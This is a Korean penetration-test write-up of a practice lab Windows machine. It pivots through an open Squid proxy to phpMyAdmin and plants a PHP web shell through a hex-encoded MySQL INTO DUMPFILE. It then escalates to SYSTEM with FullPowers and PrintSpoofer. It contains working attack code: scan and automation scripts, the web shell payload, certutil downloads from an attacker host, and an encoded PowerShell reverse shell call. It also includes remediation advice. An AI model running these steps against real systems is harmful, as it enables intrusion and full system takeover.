---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/db/mysql
  - tech/win/seimpersonate
  - tech/win/potato
  - tech/payload/revshell
  - tech/pivot/http-proxy
type: machine
platform: pg
os: windows
ip: 192.168.248.189
ports: [135, 139, 445, 3128]
services: [http-proxy, microsoft-ds, msrpc, netbios-ssn]
status: solved
manual_tags: true
tech_count: 5
---

> [!info] 요약
> 타겟 `192.168.248.189` · Windows Server 2019 Standard(build 17763, 호스트명 `SQUID`) · Fundamental · 플래그 2개
> 진입점: 외부 노출 웹 포트는 3128(Squid 오픈 프록시) 뿐 — 프록시 경유 내부 포트 열거로 8080(WampServer/phpMyAdmin) 발견 → MySQL `root` 무비번 → `INTO DUMPFILE` hex 리터럴로 웹셸 심어 `LOCAL SERVICE` 획득
> 권한상승: `LOCAL SERVICE` 는 `SeImpersonatePrivilege` 가 박탈된 상태 → FullPowers 로 복원 → PrintSpoofer 로 `spoolsv.exe`(SYSTEM) 사칭
> 시행착오·교훈 → [[_PLAYBOOK]]

> [!warning] 이 노트를 읽는 규약 — 관측 출력과 재구성을 구분
> 이 노트의 터미널 출력은 두 종류가 섞여 있음. Kali 산출물(`~/PG/Squid/`)로 대조·실증된 구간과, 대조할 원본이 없어 사후 재구성한 구간. 블록마다 「출처」 캡션으로 어느 쪽인지 표시함.
> - **실증됨**: nmap(`nmap.log`·`full_tcp.nmap`) · 프록시 포트 스캔(`proxyscan.txt`·`pscan.sh`·`psweep.sh`) · gobuster(`gobuster8080.txt`) · hex 웹셸(`sh.php` — hex 리터럴 디코드 결과가 파일과 MD5 일치) · 래퍼(`web.sh`) · phpMyAdmin 자동화(`pma.py`) · 배치 래퍼(`srv/go.bat`) · `revgen.py`→`revgen4444.py` 포트 전환 흔적(mtime)
> - **대조 불가(재구성 구간)**: WampServer 홈페이지·MySQL 배너 덤프·phpSysInfo XML·`testmysql.php` 출력·`whoami /priv` 출력·certutil 전송·FullPowers·PrintSpoofer 실행 로그·플래그 세션. 값·명령이 산출물과 교차 일치하는 부분은 보존했으나 **출력 그 자체는 대조할 원본이 없음**
> - **Kali 쪽 프롬프트는 싣지 않음.** 이 박스는 비대화형 `ssh` 호출로 풀려 `~/.zsh_history` 에 타겟 IP·`3128` 검색 결과가 0건임 — 대화형 터미널 화면이 존재한 적이 없으므로 `┌──(kali㉿kali)` 표기는 근거가 없음. 명령과 값은 그대로 두고 표기만 걷어냄. 반면 **타겟 셸 프롬프트(`PS C:\Windows\system32>`)는 실측 표식이라 보존함**

## Target #1 – 192.168.248.189

### Initial Access – 오픈 프록시로 내부망 피벗해 MySQL 파일쓰기 원시로 웹셸을 심음

**Vulnerability Explanation:**
- Squid 가 인증·출발지 제한 없이 요청을 중계(오픈 프록시) — 외부에서 도달 불가능한 내부 루프백 서비스(MySQL 3306, WampServer 8080)로 가는 경로를 제공함
- MySQL `root` 계정이 빈 패스워드이고 `@@secure_file_priv` 가 무제한 — 임의 경로 파일쓰기 원시가 됨
- 그 웹루트(`C:\wamp\www\`)에 mysqld 프로세스가 쓰기 가능하고 Apache 가 `.php` 를 실행함 — `INTO DUMPFILE` 로 심은 웹셸이 즉시 RCE 로 이어짐

**Vulnerability Fix:**
- Squid `http_access` 를 출발지 화이트리스트 + `deny all` 기본 거부로 구성. 인증이 필요하면 `proxy_auth`
- **`http_access deny to_localhost` 를 켤 것** — 이 박스 체인의 급소. 프록시가 `127.0.0.0/8` 목적지를 중계하지 않으면 루프백 전용 서비스(3306·8080)에 애초에 도달 불가. 현행 Squid 기본 `squid.conf` 는 이 줄을 활성 상태로 출하하며(squid 7.6 패키지 기본 설정에서 확인, 주석에 "Protect web applications running on the same server as Squid" 라고 사유까지 적혀 있음), `[가정]` 4.14 세대는 주석 처리 상태였을 것
- MySQL `root` 강한 패스워드 설정, `mysql_secure_installation` 실행, 애플리케이션은 최소권한 전용 계정 사용
- `@@secure_file_priv` 를 명시적 디렉터리 또는 `NULL` 로 제한하고 애플리케이션 계정에서 `FILE` 권한 회수

**Severity:** Critical — 무인증 원격 RCE(프록시 경유 사슬이지만 최종적으로 임의 코드 실행)

**Steps to reproduce the attack:**
1. 외부 nmap `-p-` — 3128(Squid) 만 웹 포트로 노출 확인, 나머지 65529 개는 `filtered`
2. `curl -x http://<타겟>:3128 http://127.0.0.1:<포트>/` 로 내부 포트 배치 열거 → 3306(MySQL)·8080(WampServer)·5985(WinRM) 발견
3. 8080 의 WampServer 홈페이지가 phpMyAdmin·adminer·phpsysinfo alias 를 노출, `testmysql.php` 가 `root` 빈 패스워드 접속 성공을 인증 없이 확인시켜줌
4. phpMyAdmin 에 `root`/빈 패스워드로 로그인, `SELECT @@secure_file_priv` 로 무제한 확인
5. `SELECT 0x<hex> INTO DUMPFILE 'C:/wamp/www/sh.php'` 로 웹셸 삽입
6. 프록시 경유 `curl` 로 웹셸 호출해 명령 실행 확인(`nt authority\local service`)

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.189 | TCP: 135, 139, 445, 3128 |

`-p-` 에서 49666·49667 도 잡혔으나 Windows 동적 RPC 대역(49152+)이라 부팅마다 바뀜 — 서비스 식별에는 의미 없어 위 표에서 제외.

```text
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3128/tcp  open  http-proxy    Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.14
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Running (JUST GUESSING): Microsoft Windows 2019 (92%)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```
— 출처: `~/PG/Squid/nmap.log` **발췌**(`nmap -sCV -p- -Pn -A --min-rate 5000`, 129.65초). 사이의 OS 지문·`Network Distance`·traceroute 구간은 생략함. `-sS` 전수 재확인은 `full_tcp.nmap`(같은 6포트).

웹 포트가 3128 하나뿐이고 나머지 65529 개는 전부 `filtered`(무응답, 방화벽이 패킷을 버림) — "서비스가 없다"가 아니라 "볼 수 없다"는 신호. SMB/RPC 와 프록시 하나 외에는 공격면이 안 보이지만, Squid 가 인증 없이 중계하면 프록시 자체가 방화벽 뒤로 가는 통로가 됨.

**내부 포트 열거 — 프록시 응답 코드로 판별**

Squid 는 `http://127.0.0.1:<포트>/` 요청을 그대로 중계함. 응답 코드로 내부 포트 개폐를 판별:

| 응답 | 의미 |
|---|---|
| `503` + `ERR_CONNECT_FAIL` | 내부 포트 연결 실패(닫힘, 루프백 대상에서는 필터링 여지가 없어 실질적으로 닫힘) |
| `403` + `ERR_ACCESS_DENIED` | Squid `Safe_ports` ACL 차단 — 개폐 판별 불가 |
| 그 외(200/400/404/405…) | 내부 포트 열림 |

```bash
#!/bin/bash
P=$1
R=$(curl -s -o /dev/null -m 6 -w '%{http_code}' -x http://192.168.248.189:3128 http://127.0.0.1:$P/ 2>/dev/null)
if [ "$R" != "503" ] && [ "$R" != "000" ]; then echo "PORT $P -> HTTP $R"; fi
```
— 출처: `~/PG/Squid/pscan.sh`(전문, mtime 18:23)

```bash
#!/bin/bash
P=$1
R=$(curl -s -o /dev/null -m 8 -w '%{http_code}|%{size_download}' -x http://192.168.248.189:3128 http://127.0.0.1:$P/ 2>/dev/null)
C=${R%%|*}
if [ "$C" != "503" ] && [ "$C" != "000" ]; then echo "OPEN $P -> $R"; fi
```
— 출처: `~/PG/Squid/psweep.sh`(전문, mtime 18:25). 응답 본문 크기까지 받는 개정판. 전 포트를 이 스크립트로 훑어 `proxyscan.txt`(21KB·1020행)에 모음.

`-x http://<타겟>:3128` 이 핵심 — 없으면 칼리 자신의 `127.0.0.1` 에 접속함. 목적지는 항상 `127.0.0.1`(타겟 자신의 루프백) — 서비스가 `0.0.0.0` 이 아니라 루프백에만 바인드돼 있으면 외부 IP 로는 안 붙고 이 경로로만 붙음.

`proxyscan.txt`(비-403 라인 전체):
```text
PORT 3128 -> HTTP 400
PORT 3306 -> HTTP 200
PORT 5985 -> HTTP 404
PORT 8080 -> HTTP 200
PORT 47001 -> HTTP 404
```
— 출처: `~/PG/Squid/proxyscan.txt`(비-403 라인 전량, 원문 그대로). 나머지 1015행은 전부 403.

| 포트 | 판정 | 서비스 |
|---|---|---|
| 3128 | Squid 자신(`ERR_INVALID_URL`) | Squid 4.14 |
| 3306 | 열림 | MySQL 5.7.31 |
| 5985 | 열림 | WinRM |
| 8080 | 열림 | Apache 2.4.46 (Win64) / PHP 7.3.21 / WampServer |
| 47001 | 열림 | WinRM HTTP 리스너 |

MySQL 배너도 프록시를 통해 그대로 샘(HTTP/0.9 로 감싸져 나옴) — Squid 는 응답 첫 줄이 `HTTP/x.x` 가 아니면 HTTP/0.9 본문으로 간주해 그대로 전달함:
```text
X-Transformed-From: HTTP/0.9
Via: 1.1 SQUID (squid/4.14)

J^@^@^@
5.7.31^@^M^@^@^@Q!^_^KH7^SZ ... mysql_native_password ... Got packets out of order
```
MySQL 5.7.31, 인증 플러그인 `mysql_native_password`.

프록시 열거의 한계 — Squid `Safe_ports` ACL(21,70,80,210,280,443,488,591,777 및 1025-65535) 밖의 1024 이하 포트는 전부 403 이라 개폐 판별 불가(허용 하한이 1025 이므로 차단 경계는 1024 이하). `proxyscan.txt` 의 403 포트 최댓값이 정확히 1024, 403 총 개수가 1015 = (1..1024) 1024개 − Safe_ports 9개로 산수가 맞음. `[가정]` `CONNECT` 는 443 외 전부 차단(443 엔 서비스 없음) — Squid 기본 `SSL_ports`·`deny CONNECT !SSL_ports` 로 추정. 위 403 분포가 `Safe_ports` 기본값과 정확히 일치하므로 설정이 기본에 가깝다는 방증은 있으나, cache manager(`/squid-internal-mgr/info`)도 403 이라 설정 덤프로 확증하지는 못함. **"스캔했는데 안 나왔다"와 "스캔할 수 없었다"는 다름** — 커버리지 한계로 명시.

**버전 판정 — 독립 근거 2개**

8080 의 WampServer 홈페이지가 스택 구성을 통째로 렌더함 — Apache 2.4.46 / PHP 7.3.21 / MySQL 5.7.31(3306) / MariaDB 10.4.13(3307) 과 alias 목록 `adminer phpmyadmin phpsysinfo`. ⚠️ **선언된 MariaDB 3307 은 `proxyscan.txt` 에 아예 없음** — 이 스크립트는 503·000 을 출력에서 제외하므로 부재 = 연결 실패 = 미기동. 설정이 말하는 것은 의도이지 현실이 아님.

```text
curl -s -x http://192.168.248.189:3128 http://127.0.0.1:8080/phpmyadmin/ | grep -oE 'PMA_VERSION:"[0-9.]+"'
PMA_VERSION:"5.0.2"

curl -s -x http://192.168.248.189:3128 http://127.0.0.1:8080/adminer/ | grep -oE 'version=[0-9.]+'
version=4.7.7
```
— 재구성 구간(§ 규약 콜아웃 참조). 명령·값은 남아 있으나 대조할 출력 원본이 `~/PG/Squid/` 에 없음.

| 앱 | 버전 | 독립 근거 2개 |
|---|---|---|
| Apache / PHP | 2.4.46 (Win64) / 7.3.21 | 8080 응답 `Server`·`X-Powered-By` 헤더 / `phpinfo` 의 `C:\wamp\bin\apache\apache2.4.46\bin\php.ini` |
| phpMyAdmin | 5.0.2 | 인라인 JS `PMA_VERSION`(런타임) / `RELEASE-DATE-5.0.2` 정적 파일 |
| Adminer | 4.7.7 | CSS·JS 자산의 `version=` 파라미터(런타임, 2개 자산에서 교차) |
| phpSysInfo | 3.3.2 | `<Generation version="3.3.2">` |

런타임이 렌더한 값(캐시버스터·인라인 JS)을 정적 파일보다 우선함 — 정적 파일은 업그레이드 후에도 남을 수 있음.

`xml.php?plugin=complete`(phpSysInfo, 인증 없이 응답)가 호스트명 `SQUID`·Windows Server 2019 Standard build 17763·MAC·VMware 게스트·C: 30GB NTFS 를 유출. nmap 의 OS 추측(92% Windows 2019)과 교차 일치.

`?phpinfo=1` 로 설치 경로 확인 → `C:\wamp\bin\apache\apache2.4.46\bin\php.ini` → 웹루트 `C:\wamp\www\`.

`/testmysql.php`(wamp 기본 스크립트)가 인증 없이 `root`/빈 패스워드로 MySQL 접속 성공을 그대로 보여줌 — phpMyAdmin 로그인 자격증명을 로그인 시도 전에 확정.

**디렉터리 열거**

프록시 경유라 매우 느려 대규모 워드리스트는 300초 제한에 걸려 미완주(부분 커버리지):
```bash
gobuster dir -u http://127.0.0.1:8080/ --proxy http://192.168.248.189:3128 \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak
```
(호출 형태는 재구성 — `gobuster8080.txt` 에 배너가 없어 인자 원본은 대조 불가)

```text
/index                (Status: 200) [Size: 6448]
/index.php            (Status: 200) [Size: 6448]
/Index                (Status: 200) [Size: 6448]
/Index.php            (Status: 200) [Size: 6448]
/favicon              (Status: 200) [Size: 202575]
/INDEX.php            (Status: 200) [Size: 6448]
/INDEX                (Status: 200) [Size: 6448]
/phpmyadmin           (Status: 301) [Size: 328] [--> http://127.0.0.1:8080/phpmyadmin/]
```
— 출처: `~/PG/Squid/gobuster8080.txt`(비-403 라인 전량, 원문 그대로). 나머지 10행은 워드리스트 주석줄(`/# license, visit ...`)·`/*checkout*` 이 그대로 요청돼 나온 403 잡음.

`/index.php`·`/Index.php`·`/INDEX.php` 가 전부 200 = 대소문자 구분 없는 파일시스템 = Windows 확증. 역으로 gobuster 결과 개수를 그대로 읽으면 안 됨 — 실제 엔드포인트는 하나임.

타겟형 프로브가 훨씬 효율적이었음 — WampServer 홈페이지가 이미 alias 목록(`adminer phpmyadmin phpsysinfo`)을 줬으므로 `/adminer`·`/phpsysinfo`·`/wampthemes`·`/testmysql.php` 를 직접 찔러 전부 적중.

### Initial Access – 프록시 피벗 → phpMyAdmin → DUMPFILE 웹셸

프록시 경유라 브라우저 대신 스크립트로 자동화. `requests.Session` 에 프록시를 물리되 `trust_env=False` 가 필수(환경변수 프록시가 끼어드는 것을 막음). phpMyAdmin 은 요청마다 CSRF `token` 이 갱신되므로 로그인 응답에서 새 토큰을 다시 파싱해 다음 요청에 씀 — 안 하면 에러 없이 로그인 페이지로 조용히 되돌아옴.

```python
PROXY = {'http':'http://192.168.248.189:3128'}
BASE  = 'http://127.0.0.1:8080/phpmyadmin/'
s = requests.Session(); s.proxies = PROXY; s.trust_env = False
r = s.get(BASE, timeout=25)
tok = re.search(r'name="token" value="([^"]+)"', r.text).group(1)
ss  = re.search(r'name="set_session" value="([^"]+)"', r.text)
r = s.post(BASE+'index.php', data={'set_session': ss.group(1) if ss else '',
    'pma_username':'root','pma_password':'','server':'1','target':'index.php','token':tok}, timeout=25)
if 'pma_password' in r.text:
    print('[!] LOGIN FAILED'); sys.exit(1)
tok = re.search(r'name="token" value="([^"]+)"', r.text).group(1)
sql = sys.stdin.read()
r = s.post(BASE+'import.php', data={'db':'','table':'','sql_query':sql,'token':tok,
    'ajax_request':'true','is_js_confirmed':'0'}, timeout=60)
```
— 출처: `~/PG/Squid/pma.py`(발췌 — import/응답 파싱부 생략). `tok` 을 **두 번** 뽑는 것이 핵심 — 로그인 응답에서 갱신된 토큰을 다시 파싱해야 `import.php` 가 SQL 을 실행함. SQL 은 stdin 으로 받아 파이프로 밀어 넣는 구조.

정찰 쿼리:
```sql
SELECT @@version, USER(), @@datadir, @@secure_file_priv, @@basedir;
```
```text
5.7.31
root@localhost
C:\wamp\bin\mysql\mysql5.7.31\data\
                                     ← @@secure_file_priv 가 빈 문자열
C:\wamp\bin\mysql\mysql5.7.31\
```
`@@secure_file_priv` 가 빈 문자열 = 파일 쓰기 무제한. (`NULL` 이면 전면 차단, 경로면 그 안에서만.)

웹셸 원문에 `"`·`'`·`$`·`<`·`>` 가 섞여 파이썬 문자열→HTTP POST→PHP→MySQL 파서 4개 계층에서 인용이 깨짐. MySQL 의 `0x...` hex 리터럴로 전부 우회:
```php
<?php echo "PWN:"; if(isset($_REQUEST['c'])){ echo shell_exec($_REQUEST['c']); } ?>
```
```bash
echo -n '<?php echo "PWN:"; ... ?>' | xxd -p | tr -d '\n'
```
```sql
SELECT 0x3c3f706870206563686f202250574e3a223b20696628697373657428245f524551554553545b2763275d29297b206563686f207368656c6c5f6578656328245f524551554553545b2763275d293b207d203f3e0a
INTO DUMPFILE 'C:/wamp/www/sh.php';
```
— 이 hex 리터럴을 디코드하면 `~/PG/Squid/sh.php` 와 MD5 가 일치함(`e8b6150f5c53ae517e0294233037c8d4`). 페이로드는 실측 확정.

```text
[success] MySQL returned an empty result set (Query took 0.0008 seconds.)
```
— 재구성 구간(phpMyAdmin 응답 원본 없음).
`INTO DUMPFILE` 는 단일 행을 가공 없이 그대로 씀(`INTO OUTFILE` 은 열/행 구분자를 삽입해 바이너리·정확한 바이트열을 깨뜨림). 경로는 슬래시(`C:/wamp/www/`) — 백슬래시는 SQL 이스케이프와 충돌. 두 구문 모두 기존 파일을 덮어쓰지 못함(`Errcode: 17 - File exists`) — 같은 파일명 재시도는 무의미, 파일명을 바꿔야 함.

웹셸에 고정 마커(`PWN:`)를 넣은 이유 — 빈 응답만으로는 "실행됐는데 출력이 없다"와 "웹셸 자체가 없다"를 구분 못 함. `$_REQUEST` 는 GET·POST 어느 쪽으로든 받기 위함.

```bash
#!/bin/bash
curl -s -m 60 -x http://192.168.248.189:3128 --get --data-urlencode "c=$*" http://127.0.0.1:8080/sh.php
```
— 출처: `~/PG/Squid/web.sh`(전문, mtime 18:31)

```text
./web.sh whoami
PWN:nt authority\local service
```
— 재구성 구간. 계정 판정(`nt authority\local service`)은 뒤의 `whoami /priv` 3개 특권과 정합하나, 이 실행 로그 자체의 원본은 없음.

`--data-urlencode` 는 필수 — Windows 명령의 공백·`&`·`\` 가 그대로면 반드시 깨짐. `-m 60` 은 프록시 왕복 + Windows 명령 실행 지연을 감안한 타임아웃.

이 웹셸은 상태가 없음 — 매 요청이 새 `cmd.exe`. Windows 에는 TTY 개념이 없어 `python3 -c 'import pty'` 류의 TTY 업그레이드 단계가 존재하지 않음. 대신 항상 절대경로로 명령을 조립하고, 필요하면 `cmd /c "A && B"` 로 한 요청에 묶음.

**Local.txt value:**
`02ef1765e826b864a4b6cb74e532398c` — 위치는 `C:\local.txt`(비표준, `C:\Users\` 에는 `Administrator`·`Public` 뿐).

⚠️ 이 값은 이 웹셸 foothold 시점이 아니라 **`Privilege Escalation` 재현 절에서 SYSTEM 획득 이후 같은 세션**에서 읽었음 — 산출물에 `LOCAL SERVICE` 세션에서 `local.txt` 를 읽은 별도 기록이 없음(`whoami` 확인만 있음).

### Privilege Escalation – LOCAL SERVICE 특권 복원(FullPowers) 후 PrintSpoofer로 SYSTEM

**Vulnerability Explanation:**
- `LOCAL SERVICE` 계정은 원래 `SeImpersonatePrivilege` 를 보유하나, Windows Vista 이후 서비스 최소특권 모델에 따라 서비스 제어 관리자(SCM)가 서비스를 기동할 때 `RequiredPrivileges` 선언 외 특권을 토큰에서 제거함. 이 웹셸은 Apache 서비스의 자식 프로세스로 태어나 그 깎인 토큰을 상속받음(3개만 보유, `SeImpersonate` 없음)
- FullPowers 가 예약 작업(작업 스케줄러)으로 `LOCAL SERVICE` 를 재기동 — 작업 스케줄러는 서비스가 아니므로 SCM 의 특권 축소가 적용되지 않아, 그 프로세스는 `LOCAL SERVICE` 의 기본 특권 전체(`SeImpersonate` 포함, 7개)를 가진 토큰으로 뜸
- `SeImpersonatePrivilege` 보유 + Print Spooler 서비스 가동 중 → PrintSpoofer 가 Spooler RPC 로 `spoolsv.exe`(SYSTEM)를 우리 명명 파이프에 접속시켜 그 토큰을 임퍼소네이트

**Vulnerability Fix:**
- 서비스 계정에 의한 예약 작업 생성(이벤트 4698)·비정상 명명 파이프 생성 모니터링 — 근본 차단은 어려우므로 탐지로 보완
- 서버에서 인쇄가 불필요하면 Print Spooler 서비스 비활성화(PrintNightmare 계열까지 함께 차단)
- Defender 실시간 보호를 켤 것 — 이 박스는 익스플로잇 바이너리 2종이 아무 저지 없이 실행됨(단 `Get-MpComputerStatus` 출력은 산출물에 없어 실제 설정값은 **관측 없음**). 서명 기반만으로는 리네이밍·패커에 뚫리므로 행위 기반 탐지 병행

**Severity:** Critical — 즉시 SYSTEM 권한 획득

**Steps to reproduce the attack:**
1. `whoami /priv` — `SeImpersonate` 없음(3개뿐), 계정이 `LOCAL SERVICE` 확인
2. FullPowers·PrintSpoofer 바이너리를 certutil 로 전송. 상대 파일명으로는 성공 배너가 뜨고도 파일이 없었으므로 **쓰기 가능한 절대경로**(`C:\Users\Public\fp.exe`·`ps.exe`)로 재전송(원인 판정은 「도구 전송」 절 참조)
3. FullPowers 실행 → 예약 작업 경유로 특권 복원(3개→7개, `SeImpersonate` 포함) 확인
4. 그 토큰 컨텍스트에서 PrintSpoofer 실행 → `-enc` UTF-16LE base64 로 감싼 리버스셸 페이로드
5. 리스너에 SYSTEM 셸 연결 확인(`nt authority\system`)

**열거 — Windows 셸을 잡자마자**

```text
PRIVILEGES INFORMATION
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```
— 재구성 구간(`whoami /priv` 출력 원본 없음).

3개뿐 — 전부 무해한 기본 특권(모든 프로세스가 사실상 보유). "특권이 3개 있다"가 아니라 "관리자급 특권이 0개다"로 읽어야 함.

**도구 전송**

```text
certutil -urlcache -f http://192.168.45.207:8000/PrintSpoofer64.exe PrintSpoofer64.exe
CertUtil: -URLCache command completed successfully.
```
— 재구성 구간(certutil 실행 로그 원본 없음).

"완료" 배너에도 `dir` 로 확인하니 파일이 없었음. 이후 **파일명을 `ps.exe`·`fp.exe` 로 바꾸면서 동시에 쓰기 가능한 절대경로**(`C:\Users\Public\`)를 지정해 전송이 통과함 — 최종 상태는 `~/PG/Squid/srv/go.bat` 의 `C:\Users\Public\ps.exe` 로 확증됨.

⚠️ **원인은 확정되지 않음.** 두 변수(파일명·경로)를 한 번에 바꿨으므로 어느 쪽이 실제 해결이었는지 산출물로 가를 수 없음.
- **반증된 것** — 「AV 가 파일명 시그니처로 탐지했다」. Defender 의 탐지 기전은 내용·행위·ML 기반이고 파일명은 *제외 목록*에서만 쓰임. PrintSpoofer 는 실제로 내용 기반(`HackTool:Win64/PrintSpoofer!MTB`)으로 잡히는 도구라 이름 변경만으로는 회피되지 않음
- **[가정] 남은 유력 원인** — `certutil -urlcache -f` 가 대상 경로에 쓰지 못할 때도 "완료" 배너를 반환하고, 웹셸(Apache/`LOCAL SERVICE`) 컨텍스트의 CWD 가 쓰기 불가라 상대 파일명이 그리로 해석돼 사라진 것. **이 박스에서 직접 확인한 것은 아님** — 재현 로그가 없어 certutil 쪽 동작을 실측하지 못함
- **관측 없음** — `RealTimeProtectionEnabled` 값을 포함한 Defender 상태 조회 출력이 산출물에 없음

칼리 쪽:
```bash
python3 -m http.server 8000
```

**1단계 — FullPowers**

```powershell
C:\Users\Public\fp.exe -c "cmd /c whoami /priv > C:\Users\Public\priv_after.txt 2>&1" -z
[+] Started dummy thread with id 960
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
```
```text
Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled   ← 복원됨
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```
— 재구성 구간(FullPowers 실행 로그·`priv_after.txt` 원본 없음).

3개 → 7개, `SeImpersonatePrivilege` 복원 확인. `> ... 2>&1` 로 출력을 파일 리다이렉트한 이유 — `CreateProcessAsUser` 로 만든 프로세스는 우리 웹셸과 콘솔이 분리돼 화면에 아무것도 안 나옴.

**2단계 — PrintSpoofer**

중첩 인용을 피하려 배치 파일로 감쌈:
```bat
C:\Users\Public\ps.exe -c "powershell -nop -w hidden -enc <UTF16LE-base64 리버스셸>"
```
— 출처: `~/PG/Squid/srv/go.bat`(1행 전문. base64 본문 1029자는 지면상 치환, 원본은 `rev4444.b64` 와 동일). 생성기는 `mkbat.py`.
```text
cmd /c C:\Users\Public\fp.exe -c "cmd /c C:\Users\Public\go.bat" -z
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
```
```powershell
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.189] 58526
PS C:\Windows\system32> whoami; hostname
nt authority\system
SQUID
```
— 이 절의 `go.bat` 호출·FullPowers 출력·리스너 세션 세 블록은 재구성 구간(규약 콜아웃 참조). LHOST·포트는 산출물 `revgen4444.py`(`192.168.45.207`:`4444`)와 일치하고, 타겟 pty 프롬프트 `PS C:\Windows\system32>` 는 리버스셸이 대화형이었다는 표식이라 그대로 보존함.

`-enc` 의 base64 는 **UTF-16LE**(리눅스 습관대로 `base64 -w0` 만 쓰면 실패):
```bash
echo -n '<명령>' | iconv -t UTF-16LE | base64 -w0
```
인용이 `cmd /c` → `.bat` → `PrintSpoofer -c` → `powershell` 로 4중 중첩되면 반드시 깨지므로 base64(알파벳이 `[A-Za-z0-9+/=]` 뿐)로 전 계층을 통과시킴 — SQL 의 hex 리터럴과 같은 발상.

[가정] 리버스셸 포트를 443 → 4444 로 바꾼 흔적이 mtime 에 남아 있음 — `revgen.py`(LHOST:PORT=192.168.45.207:443, 18:32) → FullPowers 다운로드(18:36) → `revgen4444.py`(…:4444, 18:38). 443 시도의 결과 기록은 노트·Kali 어디에도 없어 왜 바꿨는지는 확증 불가.

**대안 경로 비교** (실제로 시도한 것은 PrintSpoofer 하나뿐 — 나머지는 산출물에 시도 기록 없음, `[가정]`)

| 경로 | 가능 여부 | 근거 |
|---|---|---|
| PrintSpoofer | ✅ 실측 성공 | Spooler 실행 중, build 17763 |
| JuicyPotato | ❌ | build 17763(1809+)에서 OXID 리졸버 로컬 포트 리디렉트 막힘 |
| RoguePotato | [가정] 가능하나 불리 | 아웃바운드 135 릴레이 필요, 미확인 |
| 5985 WinRM | ❌ | Administrator 자격증명 없음 + Squid 가 `CONNECT` 를 막아 프록시로 통과 불가 |

**플래그 — 같은 SYSTEM 세션에서 연속 확보**

```powershell
PS C:\Windows\system32> "LOCAL=" + (Get-Content C:\local.txt)
LOCAL=02ef1765e826b864a4b6cb74e532398c
PS C:\Windows\system32> "PROOF=" + (Get-Content C:\Users\Administrator\Desktop\proof.txt)
PROOF=45f64bc8483c77cf487fad00f8cb0120
```
`local.txt` 가 `C:\` 루트에 있어 `C:\Users\*\Desktop\` 패턴만 찾으면 못 찾음 — `dir C:\` 한 번으로 확인(`Get-ChildItem -Recurse` 는 리버스셸을 수 분간 블로킹시키므로 피할 것).

### Post-Exploitation

**Proof.txt value:**
`45f64bc8483c77cf487fad00f8cb0120` — 위치 `C:\Users\Administrator\Desktop\proof.txt`

**남긴 흔적**
- 심은 것: `C:\wamp\www\sh.php`(MySQL `INTO DUMPFILE`), `C:\Users\Public\{fp.exe, ps.exe, go.bat, priv_after.txt}`(certutil 전송·리다이렉트 산물). [가정] 삭제를 돌렸으나 타겟이 정지돼 `dir C:\Users\Public` 재확인 출력은 남기지 못함
- FullPowers 가 임시 예약 작업을 생성했으나 토큰 획득 직후 스스로 삭제함(도구 동작상). [가정] 잔존 없음 — `schtasks /query` 재확인 불가
- 계정 생성·설정 변경 없음. 획득 자격증명: MySQL `root` / 빈 패스워드
- Kali 쪽: 4444 리스너와 `python3 -m http.server 8000` 을 띄웠으므로 종료 대상. tmux 세션은 이름으로 종료. NFS 마운트 없음

## 관련

- SQLite `sqlite_master`/MySQL `INTO DUMPFILE` 관련: <https://dev.mysql.com/doc/refman/5.7/en/select-into.html>
- Squid ACL 문서(`http_access`·`Safe_ports`·`SSL_ports`): <http://www.squid-cache.org/Doc/config/http_access/>
- FullPowers(itm4n): <https://github.com/itm4n/FullPowers> · PrintSpoofer(itm4n): <https://github.com/itm4n/PrintSpoofer>
- [[Hawat]] — `INTO OUTFILE` + hex 리터럴 웹셸, `@@secure_file_priv` 가 `NULL` 인데도 쓰기가 된 반례
- [[Exfiltrated]] — 인용 중첩을 base64 로 회피(같은 계열)
- [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] — 누적 패턴 "응답이 성공을 뜻하지 않는다"
- [[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]] — 누적 패턴 "버전 판정은 독립 근거 2개"
- [[Nagoya]] — 같은 계열 `SeImpersonatePrivilege`→PrintSpoofer, 다른 유인 경로(MSSQL `xp_cmdshell`)
- [[Robust]] — 같은 컬렉션의 Windows 박스, Sticky Notes 자격증명 피벗
- [[_PLAYBOOK#B-72. 오픈 프록시로 «셸 없이» 내부 포트를 연다]] — 프록시 포트 스윕 절차·503/403 판별·`Safe_ports` 한계
- [[_PLAYBOOK#B-42. 특권은 "없는" 게 아니라 "박탈된" 것일 수 있다]] — 서비스 최소특권 모델과 FullPowers 원리
- [[_PLAYBOOK#B-46. `SeImpersonatePrivilege : Enabled` + Spooler 생존 → PrintSpoofer]] — 빌드별 Potato 계열 비교
- [[_PLAYBOOK#B-82. 파일 전송 후 `ls`/`md5sum`으로 확인한다]] — `certutil` 조용한 실패, AV 파일명 이론 반증
- [[01. Pentest Foundations]] — Squid 항목
